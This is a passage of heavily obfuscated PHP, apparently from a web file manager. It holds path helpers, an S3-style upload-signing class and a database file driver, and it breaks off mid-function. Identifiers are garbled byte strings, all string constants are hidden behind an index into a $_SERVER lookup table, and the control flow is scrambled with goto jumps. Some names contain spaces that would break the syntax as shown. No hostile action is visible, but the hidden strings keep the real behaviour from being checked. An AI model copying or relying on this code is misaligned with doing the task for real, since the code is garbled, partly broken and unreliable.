makeShare($aá¾›ÃÎõ‹, $Cõ…ƒö·‰…) { return self::makePath(self::KOD_SHARE_ITEM, $aá¾›ÃÎõ‹, $Cõ…ƒö·‰…); } public static function makeFileTypePath($aÏŸß—ƒĞñ) { return self::makePath(self::KOD_USER_FILE_TYPE, $aÏŸß—ƒĞñ); } public static function makeFileTagPath($Cñ¹Ä¼’²) { return self::makePath(self::KOD_USER_FILE_TAG, $Cñ¹Ä¼’²); } public static function makePath($Fƒ‰–Ê­, $FÒòˆœ¼†Ù = '', $BŒ„Óµ·Ù† = '') { $E„¬ÕÌÊêÈ =& $_SERVER[¢Í]; $DÛƒ±É¦®Ú = substr($Fƒ‰–Ê­, 1, -1); $D¾Öù©õ = $E„¬ÕÌÊêÈ[1128] . $DÛƒ±É¦®Ú . $E„¬ÕÌÊêÈ[1129] . $FÒòˆœ¼†Ù . $E„¬ÕÌÊêÈ[1130]; $D¾Öù©õ = $BŒ„Óµ·Ù† ? $D¾Öù©õ . $BŒ„Óµ·Ù† . $E„¬ÕÌÊêÈ[8] : $D¾Öù©õ; return $D¾Öù©õ; } public static function hashPath($AšäãÁªö) { $E¾Ò•Û¬ˆ¤ =& $_SERVER[¢Í]; $Bù„Ë®¨¸Ç = is_array($AšäãÁªö) ? $AšäãÁªö : IO::info($AšäãÁªö); $Cö»×Ğâ… = _get($Bù„Ë®¨¸Ç, $E¾Ò•Û¬ˆ¤[1131], $E¾Ò•Û¬ˆ¤[33]); if (!$Cö»×Ğâ…) { $E’¸¬¯¸ = KodIO::parse($Bù„Ë®¨¸Ç[$E¾Ò•Û¬ˆ¤[85]]); if (!$E’¸¬¯¸[$E¾Ò•Û¬ˆ¤[29]]) { $Cö»×Ğâ… = IO::hashSimple($Bù„Ë®¨¸Ç[$E¾Ò•Û¬ˆ¤[85]]); } } if (!$Cö»×Ğâ…) { $Cö»×Ğâ… = md5($Bù„Ë®¨¸Ç[$E¾Ò•Û¬ˆ¤[85]] . $Bù„Ë®¨¸Ç[$E¾Ò•Û¬ˆ¤[87]] . $Bù„Ë®¨¸Ç[$E¾Ò•Û¬ˆ¤[117]]); } return $Cö»×Ğâ…; } public static function initSystemPath() { goto f‰ô×ø”óó; f‰ô×ø”óó: $fšÒ…êŸæ­ =& $_SERVER[¢Í]; if (defined($fšÒ…êŸæ­[1132])) { return; } define($fšÒ…êŸæ­[1132], self::systemPath($fšÒ…êŸæ­[1133])); goto D…ñÈ…åÓÓ; D…ñÈ…åÓÓ: define($fšÒ…êŸæ­[1134], self::systemPath($fšÒ…êŸæ­[1135])); define($fšÒ…êŸæ­[1136], self::systemPath($fšÒ…êŸæ­[1137])); define($fšÒ…êŸæ­[1138], self::systemPath($fšÒ…êŸæ­[1139])); goto F½Í¬£î•; F½Í¬£î•: IOHistory::bindEvent(); goto EŒÑùí‚¸™; EŒÑùí‚¸™: } public static function systemPath($EàÎØÌ´«ê) { goto aøÌÊ¯Ê‚Œ; aøÌÊ¯Ê‚Œ: $aå¿Ÿ¹¥‘ =& $_SERVER[¢Í]; $E©­µ“” = $aå¿Ÿ¹¥‘[1140] . ucfirst($EàÎØÌ´«ê); $FÌä¹Å½…Ü = Model($aå¿Ÿ¹¥‘[1090])->get($E©­µ“”); goto a„ÁÕ›§¨; B¦±¯¤Îó: return $FÌä¹Å½…Ü; goto eÂø‚ÊêÉ‰; a„ÁÕ›§¨: if ($FÌä¹Å½…Ü) { return $FÌä¹Å½…Ü; } if ($EàÎØÌ´«ê == $aå¿Ÿ¹¥‘[1133]) { $FÌä¹Å½…Ü = self::make(Model($aå¿Ÿ¹¥‘[765])->systemRootPathAdd($aå¿Ÿ¹¥‘[1141])); } else { $FÌä¹Å½…Ü = self::systemPath($aå¿Ÿ¹¥‘[1133]); $EĞÂ²ÑËœÍ = self::sourceID($FÌä¹Å½…Ü); $FÌä¹Å½…Ü = self::make(Model($aå¿Ÿ¹¥‘[765])->mkdir($EĞÂ²ÑËœÍ, $EàÎØÌ´«ê)); } Model($aå¿Ÿ¹¥‘[1090])->set($E©­µ“”, $FÌä¹Å½…Ü); goto B¦±¯¤Îó; eÂø‚ÊêÉ‰: } public static function systemFolder($d¶£Ó½—À) { $a­Ö¿—ƒÎø = IO_PATH_SYSTEM_SOURCE . $d¶£Ó½—À; $AÒ•Õ×“¨Ã = Cache::get($a­Ö¿—ƒÎø); if (!$AÒ•Õ×“¨Ã) { $FÁ÷‚Í¸® = IO::infoFull($a­Ö¿—ƒÎø); if (!$FÁ÷‚Í¸®) { $AÒ•Õ×“¨Ã = IO::mkdir($a­Ö¿—ƒÎø, REPEAT_SKIP); } else { $AÒ•Õ×“¨Ã = $FÁ÷‚Í¸®[$_SERVER[¢Í][85]]; } Cache::set($a­Ö¿—ƒÎø, $AÒ•Õ×“¨Ã, 3600 * 10); } return $AÒ•Õ×“¨Ã; } public static function defaultDriver() { return Model($_SERVER[¢Í][717])->defaultDriver(); } public static function defaultIO() { $fÀ³·¸…‡“ =& $_SERVER[¢Í]; $CÏóÅš´Şî = self::defaultDriver(); return $fÀ³·¸…‡“[1142] . $CÏóÅš´Şî[$fÀ³·¸…‡“[392]] . $fÀ³·¸…‡“[1130]; } public static function defaultDriverInit() { static $Cô®½’Ãø = false; if ($Cô®½’Ãø) { return $Cô®½’Ãø; } $Cô®½’Ãø = IO::init(self::defaultIO()); return $Cô®½’Ãø; } public static function fileTypeList() { $BŞÙ´º°Ó =& $_SERVER[¢Í]; $cÖ™šÕÙ‚ = $GLOBALS[$BŞÙ´º°Ó[6]][$BŞÙ´º°Ó[1143]]; foreach ($cÖ™šÕÙ‚ as $dãÃ¹îÙ§ñ => $EåİÄ®Ä¬ë) { $cäÈêäÑ† = $BŞÙ´º°Ó[1144] . $dãÃ¹îÙ§ñ; $DòÁ‰ŞŒôØ = LNG($cäÈêäÑ†); if ($cäÈêäÑ† != $DòÁ‰ŞŒôØ) { $cÖ™šÕÙ‚[$dãÃ¹îÙ§ñ][$BŞÙ´º°Ó[28]] = $DòÁ‰ŞŒôØ; } } return $cÖ™šÕÙ‚; } public static function transferType($B‡Á­å¢ã, $Aˆ“„ª¦ÃÖ) { goto böŸÕóº¹¦; eÖ¥©åì: if ($Bª††Ø­ˆÃ[$DÓÎ†Á¨Œß[29]] == $D®Ï‰ËœßŠ[$DÓÎ†Á¨Œß[29]] && $Bª††Ø­ˆÃ[$DÓÎ†Á¨Œß[1145]] == $D®Ï‰ËœßŠ[$DÓÎ†Á¨Œß[1145]]) { return $DÓÎ†Á¨Œß[1146]; } if ($Bª††Ø­ˆÃ[$DÓÎ†Á¨Œß[29]] == $DÓÎ†Á¨Œß[798] && $D®Ï‰ËœßŠ[$DÓÎ†Á¨Œß[29]] == $DÓÎ†Á¨Œß[112]) { return $DÓÎ†Á¨Œß[1061]; } if ($Bª††Ø­ˆÃ[$DÓÎ†Á¨Œß[29]] == $DÓÎ†Á¨Œß[112] && $D®Ï‰ËœßŠ[$DÓÎ†Á¨Œß[29]] == $DÓÎ†Á¨Œß[798]) { return $DÓÎ†Á¨Œß[113]; } goto Cí¹ŒŒ ‡Ø; böŸÕóº¹¦: $DÓÎ†Á¨Œß =& $_SERVER[¢Í]; $Bª††Ø­ˆÃ = self::driverType($B‡Á­å¢ã); $D®Ï‰ËœßŠ = self::driverType($Aˆ“„ª¦ÃÖ); goto eÖ¥©åì; Cí¹ŒŒ ‡Ø: return $DÓÎ†Á¨Œß[1147]; goto CŠ´ö¬¢†ƒ; CŠ´ö¬¢†ƒ: } public static function driverType($Aø½ôø¤ø…) { goto CàöãÓ¾¸; CàöãÓ¾¸: $e×º¯Ìôò­ =& $_SERVER[¢Í]; $Fõ³ªÈÑ„¸ = $Aø½ôø¤ø…->path; $cŞöëØ¿àÖ = str_replace($e×º¯Ìôò­[1148], $e×º¯Ìôò­[33], strtolower($Aø½ôø¤ø…->getType())); goto DÈ— ÂùÃ¥; DÈ— ÂùÃ¥: if ($cŞöëØ¿àÖ == $e×º¯Ìôò­[708] || $cŞöëØ¿àÖ == $e×º¯Ìôò­[1149] || $cŞöëØ¿àÖ == $e×º¯Ìôò­[1150]) { $Aø½ôø¤ø… = self::defaultDriverInit(); } else { if ($cŞöëØ¿àÖ == $e×º¯Ìôò­[1068] || $cŞöëØ¿àÖ == $e×º¯Ìôò­[1151]) { $Aø½ôø¤ø… = IO::init($Aø½ôø¤ø…->pathParse[$e×º¯Ìôò­[1015]]); } } $cŞöëØ¿àÖ = str_replace($e×º¯Ìôò­[1148], $e×º¯Ìôò­[33], strtolower($Aø½ôø¤ø…->getType())); if ($cŞöëØ¿àÖ == $e×º¯Ìôò­[112]) { return array($e×º¯Ìôò­[29] => $e×º¯Ìôò­[112], $e×º¯Ìôò­[1145] => $e×º¯Ìôò­[33], $e×º¯Ìôò­[85] => $Fõ³ªÈÑ„¸); } goto a·Óİ‡é§‚; a·Óİ‡é§‚: return array($e×º¯Ìôò­[29] => $e×º¯Ìôò­[798], $e×º¯Ìôò­[1145] => $Aø½ôø¤ø…->pathDriver, $e×º¯Ìôò­[85] => $Fõ³ªÈÑ„¸); goto c»ğ‘Æ¢ì; c»ğ‘Æ¢ì: } } class PathDriverCOS extends PathDriverBaseS3 { public function __construct($F¦Õ’à¨á) { parent::__construct($F¦Õ’à¨á); $this->signatureVersion($_SERVER[¢Í][218]); } public function uploadFormData($EÅŠîÃ‘“—, $CÃ†ƒ¯‡ó¡ = 3600) { goto C‰İè‘ÍğÏ; B’‰°ğ†Óº: $c³Ã˜ª–Õƒ = sha1($f¢É¹ËÛì˜); $fåøî‡²Õç = hash_hmac($AÈç…ÒóÂ[235], $c³Ã˜ª–Õƒ, $fä‚â¿’Ò); $a•¶’æ·Ğ“ = array($AÈç…ÒóÂ[1156] => $C‡í«ï‹, $AÈç…ÒóÂ[1160] => $EÅšˆî…, $AÈç…ÒóÂ[1164] => base64_encode($f¢É¹ËÛì˜), $AÈç…ÒóÂ[1161] => $A²ùêÕ²Û, $AÈç…ÒóÂ[1162] => $this->accessKey, $AÈç…ÒóÂ[1165] => $a½‘‰äïí“, $AÈç…ÒóÂ[1166] => $fåøî‡²Õç, $AÈç…ÒóÂ[183] => $this->getHost()); goto D—á‡‰¼äÌ; D—á‡‰¼äÌ: return $a•¶’æ·Ğ“; goto D“âƒŠ»—é; eŞµËï¶Ú: $f¢É¹ËÛì˜ = array($AÈç…ÒóÂ[1154] => $Aå‰°Ş×‘Ù, $AÈç…ÒóÂ[1155] => array(array($AÈç…ÒóÂ[1156] => $C‡í«ï‹), array($AÈç…ÒóÂ[1157] => $this->bucket), array($AÈç…ÒóÂ[1158], $AÈç…ÒóÂ[1159], $AÈç…ÒóÂ[33]), array($AÈç…ÒóÂ[1160] => $EÅšˆî…), array($AÈç…ÒóÂ[1161] => $A²ùêÕ²Û), array($AÈç…ÒóÂ[1162] => $this->accessKey), array($AÈç…ÒóÂ[1163] => $a½‘‰äïí“))); $f¢É¹ËÛì˜ = json_encode($f¢É¹ËÛì˜); $fä‚â¿’Ò = hash_hmac($AÈç…ÒóÂ[235], $a½‘‰äïí“, $this->secret); goto B’‰°ğ†Óº; Eø¿®¶Ô: $EÅšˆî… = $AÈç…ÒóÂ[1152]; $Aå‰°Ş×‘Ù = gmdate($AÈç…ÒóÂ[1153], time() + $CÃ†ƒ¯‡ó¡); $a½‘‰äïí“ = (string) time() . $AÈç…ÒóÂ[77] . (string) (time() + $CÃ†ƒ¯‡ó¡); goto eŞµËï¶Ú; C‰İè‘ÍğÏ: $AÈç…ÒóÂ =& $_SERVER[¢Í]; $C‡í«ï‹ = $AÈç…ÒóÂ[199]; $A²ùêÕ²Û = $AÈç…ÒóÂ[235]; goto Eø¿®¶Ô; D“âƒŠ»—é: } public function fileOutLink($B—¤›ß„Â¢) { $E‹‡ÇØß =& $_SERVER[¢Í]; if (substr($B—¤›ß„Â¢, 0, 7) == $E‹‡ÇØß[1167]) { $B—¤›ß„Â¢ = $E‹‡ÇØß[1168] . substr($B—¤›ß„Â¢, 7); } header($E‹‡ÇØß[166] . $B—¤›ß„Â¢); die; } } class PathDriverDB extends PathDriverBase { public $model; public $pathParse; public function __construct($b£¡òê›ñ) { $this->pathParse = $b£¡òê›ñ; $this->model = Model($_SERVER[¢Í][1169]); } public function getPath($eùö£ÏŠÚØ) { return trim($eùö£ÏŠÚØ, $_SERVER[¢Í][8]); } public function pathFather($b´Ü°ùÕÓ) { $d‹´ÂßÚ»· = $this->parse($b´Ü°ùÕÓ); $d‹´ÂßÚ»· = $this->infoSimple($b´Ü°ùÕÓ); return $d‹´ÂßÚ»· ? $d‹´ÂßÚ»·[$_SERVER[¢Í][487]] : !1; } public function pathThis($AÎÄ•°ÀÇ½) { $Eø†šĞÂ½± = $this->infoSimple($AÎÄ•°ÀÇ½); return $Eø†šĞÂ½± ? $Eø†šĞÂ½±[$_SERVER[¢Í][28]] : !1; } public function getPathOuter($F±Ôµµ“Ø) { if (!$F±Ôµµ“Ø) { return $F±Ôµµ“Ø; } $fóµ‹æ–ø = $this->parse($F±Ôµµ“Ø); return KodIO::make($fóµ‹æ–ø[$_SERVER[¢Í][392]]); } public function copyFolderFromIO($fíÏ¡áÇïÅ, $eî×ÍŸ’¼‡, $B‰„ºŠËÚ, $b¡¶œ¬ÊˆÅ, $eºæ£‚ÂÆ) { $f„§”í­ô£ = $this->model->copyFolderFromIO($fíÏ¡áÇïÅ, $eî×ÍŸ’¼‡, $B‰„ºŠËÚ, $b¡¶œ¬ÊˆÅ, $eºæ£‚ÂÆ); return KodIO::make($f„§”í­ô£); } public function isParentOf($cÎƒœ¹„ƒ‰, $EÄœÊæÊÑ) { return $this->model->isParentOf($cÎƒœ¹„ƒ‰, $EÄœÊæÊÑ); } public function mkfile($b¤ïµÈŒĞ§, $Eå‘¶…‹– = '', $D…Õù½…‹‰ = REPEAT_RENAME) { $C³³Ÿ´‰İ =& $_SERVER[¢Í]; $Cç‡ñŒ¬Ş = $this->parse($b¤ïµÈŒĞ§); $b¤ïµÈŒĞ§ = $Cç‡ñŒ¬Ş[$C³³Ÿ´‰İ[392]]; for ($B®‚ğë…ğ = 0; $B®‚ğë…ğ < count($Cç‡ñŒ¬Ş[$C³³Ÿ´‰İ[1170]]); $B®‚ğë…ğ++) { $còï¿»Üï = $Cç‡ñŒ¬Ş[$C³³Ÿ´‰İ[1170]][$B®‚ğë…ğ]; if ($B®‚ğë…ğ == count($Cç‡ñŒ¬Ş[$C³³Ÿ´‰İ[1170]]) - 1) { $b¤ïµÈŒĞ§ = $this->model->mkfile($b¤ïµÈŒĞ§, $còï¿»Üï, $Eå‘¶…‹–, $D…Õù½…‹‰); break; } $b¤ïµÈŒĞ§ = $this->model->mkdir($b¤ïµÈŒĞ§, $còï¿»Üï, REPEAT_SKIP); } return $this->getPathOuter($b¤ïµÈŒĞ§); } public function mkdir($cÕèğÚá½, $Eˆ©´¼ö«° = REPEAT_SKIP) { $bª®çš«²à =& $_SERVER[¢Í]; $f½òŞá‡ºï = $this->parse($cÕèğÚá½); $cÕèğÚá½ = $f½òŞá‡ºï[$bª®çš«²à[392]]; for ($bÄ‘œ°”‡ = 0; $bÄ‘œ°”‡ < count($f½òŞá‡ºï[$bª®çš«²à[1170]]); $bÄ‘œ°”‡++) { $cÊè™¿¼© = $f½òŞá‡ºï[$bª®çš«²à[1170]][$bÄ‘œ°”‡]; $cÕèğÚá½ = $this->model->mkdir($cÕèğÚá½, $cÊè™¿¼©, $Eˆ©´¼ö«°); } return $this->getPathOuter($cÕèğÚá½); } public function copyFile($D¿Œ¸²‚ÌŞ, $F¨²‚·©, $eé„ˆÔéòÅ = REPEAT_REPLACE) { $EØª“´¹àœ =& $_SERVER[¢Í]; $BÎìİÆöÎ— = $this->parse($F¨²‚·©); $e–ğÀìÌ‹ = $this->model->copy($D¿Œ¸²‚ÌŞ, $BÎìİÆöÎ—[$EØª“´¹àœ[392]], $eé„ˆÔéòÅ, $BÎìİÆöÎ—[$EØª“´¹àœ[85]]); return $e–ğÀìÌ‹ ? $this->getPathOuter($e–ğÀìÌ‹) : !1; } public function moveFile($DÇ¥ÙÏÔÙ, $AÀ˜‘ŠÖ´£, $F›ÄÏÌÉêŸ = REPEAT_REPLACE) { $dƒ³¦Ï½Æ” =& $_SERVER[¢Í]; $dµ÷¼Ô’âÛ = $this->parse($AÀ˜‘ŠÖ´£); $EÓÄÖ‡˜¡ = $this->model->move($DÇ¥ÙÏÔÙ, $dµ÷¼Ô’âÛ[$dƒ³¦Ï½Æ”[392]], $F›ÄÏÌÉêŸ, $dµ÷¼Ô’âÛ[$dƒ³¦Ï½Æ”[85]]); return $EÓÄÖ‡˜¡ ? $this->getPathOuter($EÓÄÖ‡˜¡) : !1; } public function copy($BÊÅĞ°ŞÚ‡, $FŠÀŠ±â¯­, $Cêæ¾‡©Òë = REPEAT_REPLACE) { $fƒÉóèå˜Ó = $this->parse($FŠÀŠ±â¯­); $B†ŸóŸŸÉ¡ = $this->model->copy($BÊÅĞ°ŞÚ‡, $fƒÉóèå˜Ó[$_SERVER[¢Í][392]], $Cêæ¾‡©Òë); return $B†ŸóŸŸÉ¡ ? $this->getPathOuter($B†ŸóŸŸÉ¡) : !1; } public function moveSameAllow() { } public function move($Aåòõ¬‹Ü“, $fò§ï­í, $bÁ’Áªëæ” = REPEAT_REPLACE) { $CãêÏ‰­¹² = $this->parse($fò§ï­í); $c¶¨—ãóö† = $this->model->move($Aåòõ¬‹Ü“, $CãêÏ‰­¹²[$_SERVER[¢Í][392]], $bÁ’Áªëæ”); return $c¶¨—ãóö† ? $this->getPathOuter($c¶¨—ãóö†) : !1; } public function remove($Cİñƒ¹¯É, $BŠ¼°õßÒ™ = true) { return $this->model->remove($Cİñƒ¹¯É, $BŠ¼°õßÒ™); } public function rename($F·Ÿëøñá£, $c‚ˆò˜ó‰) { $A­—…®áÍ¹ = $this->model->rename($F·Ÿëøñá£, $c‚ˆò˜ó‰); return $A­—…®áÍ¹ ? $this->getPathOuter($F·Ÿëøñá£) : $A­—…®áÍ¹; } public function size($f³Á¤ˆ¶²) { $C¾©ïù° = $this->infoSimple($f³Á¤ˆ¶²); return $C¾©ïù° ? $C¾©ïù°[$_SERVER[¢Í][87]] : 0; } public function infoSimple($bŒˆ†½Ğ…) { return $this->model->sourceInfo($bŒˆ†½Ğ…); } public function info($ešËå‡œ…Ú) { return $this->infoParse($ešËå‡œ…Ú); } public function infoAuth($BàÜ¥œ²ĞŒ) { return $this->infoParse($BàÜ¥œ²ĞŒ, !1, !0); } public function infoWithChildren($dÊ¦ùÂæè) { return $this->infoParse($dÊ¦ùÂæè, !0); } protected function infoParse($cĞ¨í‚¾Û, $e®Ú¤òøµ = false, $c¦¹—ÈĞÕ = false) { if (!$e®Ú¤òøµ) { return $this->model->pathInfo($cĞ¨í‚¾Û, $c¦¹—ÈĞÕ); } return $this->model->pathInfoMore($cĞ¨í‚¾Û); } public function infoFull($d„»á‡ƒğ) { $Aœ³øÌ½Ñ =& $_SERVER[¢Í]; $e˜­£¡†ÇŠ = explode($Aœ³øÌ½Ñ[8], $d„»á‡ƒğ); $eŠ‰åË¸”¼ = implode($Aœ³øÌ½Ñ[8], array_splice($e˜­£¡†ÇŠ, 1)); return $this->model->pathInfoByPath($e˜­£¡†ÇŠ[0], $eŠ‰åË¸”¼); } public function hashSimple($C¿‚Æˆ³Ïƒ) { $d´§ñ¤àÀ =& $_SERVER[¢Í]; $Då‰®À³òŒ = $this->infoWithChildren($C¿‚Æˆ³Ïƒ); return $Då‰®À³òŒ[$d´§ñ¤àÀ[171]][$d´§ñ¤àÀ[178]]; } public function hashMd5($CĞùØÒ­Ê—) { $Aº´¢º» =& $_SERVER[¢Í]; $f÷Âš–â™ = $this->infoWithChildren($CĞùØÒ­Ê—); return $f÷Âš–â™[$Aº´¢º»[171]][$Aº´¢º»[177]]; } public function exist($B¦«¦ÃÚ™ã) { $D¥Ó³‚çõê =& $_SERVER[¢Í]; $a±í±Š¥êğ = $this->parse($B¦«¦ÃÚ™ã); if (!$a±í±Š¥êğ[$D¥Ó³‚çõê[85]]) { return $this->isFile($B¦«¦ÃÚ™ã) || $this->isFolder($B¦«¦ÃÚ™ã); } $aÖ…«’µ¢Ï = array($D¥Ó³‚çõê[393] => $a±í±Š¥êğ[$D¥Ó³‚çõê[392]], $D¥Ó³‚çõê[28] => $a±í±Š¥êğ[$D¥Ó³‚çõê[85]]); $DÊÓ‚ïĞ‡ß = $this->model->where($aÖ…«’µ¢Ï)->find(); return $DÊÓ‚ïĞ‡ß ? !0 : !1; } public function isFile($AËÈÌ† œ) { $fÇİÑ±‘ =& $_SERVER[¢Í]; $eÆÒ•Î¦½ = $this->infoSimple($AËÈÌ† œ); return $eÆÒ•Î¦½ && $eÆÒ•Î¦½[$fÇİÑ±‘[395]] == $fÇİÑ±‘[93] ? !1 : !0; } public function isFolder($B¡‘¿µß„) { $aÈˆä†š™ =& $_SERVER[¢Í]; $E••ª»‹„• = $this->infoSimple($B¡‘¿µß„); return $E••ª»‹„• && $E••ª»‹„•[$aÈˆä†š™[395]] == $aÈˆä†š™[93] ? !0 : !1; } public function listPath($cõÅØÖ©ˆÈ, $A…½£ÂÔ³ = false) { $fÓƒ–çÖ˜ =& $_SERVER[¢Í]; if ($cõÅØÖ©ˆÈ == $fÓƒ–çÖ˜[33]) { return !1; } $A£´ÙÅÀ¿ = array($fÓƒ–çÖ˜[393] => $cõÅØÖ©ˆÈ); if ($A…½£ÂÔ³) { return $this->model->listSource($A£´ÙÅÀ¿, -1); } return $this->model->listSource($A£´ÙÅÀ¿); } public function has($BÇ¶ÎğÄ‘, $a¸ÚŒ¾°¶ = false, $f—ÌöÉá³ë = null) { $E¬©à†›Ğ£ =& $_SERVER[¢Í]; $AØÁ©†ë = $this->infoWithChildren($BÇ¶ÎğÄ‘); if ($a¸ÚŒ¾°¶) { return array($E¬©à†›Ğ£[210] => $AØÁ©†ë[$E¬©à†›Ğ£[210]], $E¬©à†›Ğ£[209] => $AØÁ©†ë[$E¬©à†›Ğ£[209]]); } return $f—ÌöÉá³ë ? $AØÁ©†ë[$E¬©à†›Ğ£[210]] : $AØÁ©†ë[$E¬©à†›Ğ£[209]]; } public function listAll($eçœÆ…Ã³) { $FÏâ”í±© = IO::info($this->pathParse[$_SERVER[¢Í][85]]); if (!$FÏâ”í±©) { return array(); } return $this->model->listAll($eçœÆ…Ã³); } public function getContent($B‹¥Òƒ˜Àå) { return $this->model->getContent($B‹¥Òƒ˜Àå); } public function setContent($F¡î˜Æ×³Æ, $b¥öğÂäÍƒ = '') { return $this->model->setContent($F¡î˜Æ×³Æ, $b¥öğÂäÍƒ); } public function fileSubstr($b˜ŒÚïóä, $d‚İë±®«, $c–“·Üâ) { return $this->model->fileSubstr($b˜ŒÚïóä, $d‚İë±®«, $c–“·Üâ); } public function download($Aºƒ©ƒõšÖ, $dˆ“à÷öŸ = '') { $cÓ²ĞêêØÏ = get_path_father($dˆ“à÷öŸ); $eÄÚÄÎô™µ = get_path_this($dˆ“à÷öŸ); $AÃß“î¢¡Ü = $this->model->fileInfoGet($Aºƒ©ƒõšÖ); $d‚¼¨«÷¼¢ = IO::copy($AÃß“î¢¡Ü[$_SERVER[¢Í][85]], $cÓ²ĞêêØÏ, !1, $eÄÚÄÎô™µ); return $d‚¼¨«÷¼¢; } public function setModifyTime($D¹³šäÉÈã, $bâœ¤œ š = '') { $this->model->metaSet($D¹³šäÉÈã, $_SERVER[¢Í][1171], $bâœ¤œ š); } public function upload($C‘ñ†‚¾…¼, $A˜¢Ç—¬ë×, $Fˆê°¢ø–Â = false, $D¼åˆâ‡Ø = REPEAT_REPLACE) { $aÛÃù­ƒÏ =& $_SERVER[¢Í]; $a™ŒÀÏ¸éã = $this->parse($C‘ñ†‚¾…¼); $E¿ÄØÜ˜ñÇ = $this->model->addFile($a™ŒÀÏ¸éã[$aÛÃù­ƒÏ[392]], $A˜¢Ç—¬ë×, $a™ŒÀÏ¸éã[$aÛÃù­ƒÏ[85]], $Fˆê°¢ø–Â, $D¼åˆâ‡Ø); return $this->getPathOuter($E¿ÄØÜ˜ñÇ); } public function uploadFileByID($bƒÈ›£á³í, $d‡ÓéÖÁ‰Œ, $fôŸ‹Æ²´Ú) { $DÏùÍ©²Ê  =& $_SERVER[¢Í]; $Dğ˜ÌÑ®² = $this->parse($bƒÈ›£á³í); $cˆÁŠ‰Âç = $this->model->addFileByFileID($Dğ˜ÌÑ®²[$DÏùÍ©²Ê [392]], $d‡ÓéÖÁ‰Œ, $Dğ˜ÌÑ®²[$DÏùÍ©²Ê [85]], $fôŸ‹Æ²´Ú); return $this->getPathOuter($cˆÁŠ‰Âç); } public function addFileByRemote($Dì´«ñ¶¨ğ, $F£Æ¥¤‘—, $cò…¹İê©‰ = array(), $Aõ¹Èó–² = '', $AàÊ¥»­¢š) { $cêíÓˆ•æ =& $_SERVER[¢Í]; $eÙµÎ¼Ÿàõ = $this->parse($Dì´«ñ¶¨ğ); $Aõ¹Èó–² = empty($Aõ¹Èó–²) ? $eÙµÎ¼Ÿàõ[$cêíÓˆ•æ[85]] : $Aõ¹Èó–²; $cŞëå¤œËÅ = $this->model->addFileByRemote($eÙµÎ¼Ÿàõ[$cêíÓˆ•æ[392]], $F£Æ¥¤‘—, $Aõ¹Èó–², $cò…¹İê©‰, $AàÊ¥»­¢š); return $this->getPathOuter($cŞëå¤œËÅ); } public function uploadLink($CÁÇº„…ò´, $Eò¹é‚õ±× = 0) { $FÙ®¬Õ£‚Š =& $_SERVER[¢Í]; $Bƒê½Ì¨´ = $this->parse($CÁÇº„…ò´); $CÁÇº„…ò´ = Model($FÙ®¬Õ£‚Š[569])->createFileName($Bƒê½Ì¨´[$FÙ®¬Õ£‚Š[85]]); $F ’—„¶Œ‹ = IO::uploadLink($CÁÇº„…ò´, $Eò¹é‚õ±×); return $F ’—„¶Œ‹; } public function fileNameAuto($AÚŠÌÌÏ‹Ù, $B¶ÅãïÒ», $d£ÄÆŠİàÖ = REPEAT_REPLACE, $b ·ŒëÄ•» = false) { return $this->model->fileNameAuto($AÚŠÌÌÏ‹Ù, $B¶ÅãïÒ», $d£ÄÆŠİàÖ, $b ·ŒëÄ•»); } public function fileNameExist($a¼Åñõº, $f„îç¶é½„) { return $this->model->fileNameExist($a¼Åñõº, $f„îç¶é½„); } protected function _fileOut($a—Ä…Ùëë, $dŒŸ‡Ã×ÒÑ = false, $eáö…ÖŞó = false, $dºÛãÏ¸Ì = '', $f‘‡»¥´‡Ë = false) { goto dÚ‚ñ²¶Òç; dÚ‚ñ²¶Òç: $F…º›Ê‹ß± =& $_SERVER[¢Í]; $a¨¢¿ëãŠô = $this->model->sourceInfo($a—Ä…Ùëë); if ($a¨¢¿ëãŠô[$F…º›Ê‹ß±[395]] == $F…º›Ê‹ß±[93]) { header($F…º›Ê‹ß±[1172]); die; } goto eò¥£õÔ; eò¥£õÔ: $CƒöÔêº‘ò = $this->model->fileInfoGet($a—Ä…Ùëë); $dºÛãÏ¸Ì = $CƒöÔêº‘ò[$F…º›Ê‹ß±[177]] ? $CƒöÔêº‘ò[$F…º›Ê‹ß±[177]] : $dºÛãÏ¸Ì; $e”¨ˆ¼ÅøÀ = isset($GLOBALS[$F…º›Ê‹ß±[1173]]) ? $GLOBALS[$F…º›Ê‹ß±[1173]] : $a¨¢¿ëãŠô[$F…º›Ê‹ß±[28]]; goto DŒ“ “—ˆµ; DŒ“ “—ˆµ: if ($f‘‡»¥´‡Ë) { return IO::fileOutServer($CƒöÔêº‘ò[$F…º›Ê‹ß±[85]], $dŒŸ‡Ã×ÒÑ, $e”¨ˆ¼ÅøÀ, $dºÛãÏ¸Ì); } IO::fileOut($CƒöÔêº‘ò[$F…º›Ê‹ß±[85]], $dŒŸ‡Ã×ÒÑ, $e”¨ˆ¼ÅøÀ, $dºÛãÏ¸Ì); goto Eğ¥ßé´¯†; Eğ¥ßé´¯†: } public function fileOut($eã¾Ï³ã…ô, $d“ŸõŠ‡ğ = false, $f„¨ºåìÂ“ = false, $fñš¹®ãõ‘ = '') { $this->_fileOut($eã¾Ï³ã…ô, $d“ŸõŠ‡ğ, $f„¨ºåìÂ“, $fñš¹®ãõ‘); } public function fileOutServer($cËÜÅ¥­İ°, $C¥Õ…µ…»ì = false, $AÌ¾·½‘Ôİ = false, $D§É²Öª… = '') { $this->_fileOut($cËÜÅ¥­İ°, $C¥Õ…µ…»ì, $AÌ¾·½‘Ôİ, $D§É²Öª…, !0); } protected function _fileOutImage($d‘„í÷µ¹Æ, $c¸ê‡Ñ­‹ = 250) { goto cÁíññÏ¸í; c¶ÒÒİ•…Ç: $fäŒÑã†Î = $this->model->fileInfoGet($d‘„í÷µ¹Æ); $fäŒÑã†Î[$eŒ÷Œ¢ˆ¿”[28]] = $eë¬¬™–[$eŒ÷Œ¢ˆ¿”[28]]; $fäŒÑã†Î[$eŒ÷Œ¢ˆ¿”[170]] = $eë¬¬™–[$eŒ÷Œ¢ˆ¿”[170]]; goto F‚Óà‡¬öÀ; cÁíññÏ¸í: $eŒ÷Œ¢ˆ¿” =& $_SERVER[¢Í]; $eë¬¬™– = $this->model->pathInfo($d‘„í÷µ¹Æ); if ($eë¬¬™–[$eŒ÷Œ¢ˆ¿”[395]] == $eŒ÷Œ¢ˆ¿”[93]) { show_json($eŒ÷Œ¢ˆ¿”[1174] . $d‘„í÷µ¹Æ, !1); } goto c¶ÒÒİ•…Ç; F‚Óà‡¬öÀ: $GLOBALS[$eŒ÷Œ¢ˆ¿”[1173]] = $fäŒÑã†Î[$eŒ÷Œ¢ˆ¿”[28]]; $GLOBALS[$eŒ÷Œ¢ˆ¿”[169]] = $fäŒÑã†Î; 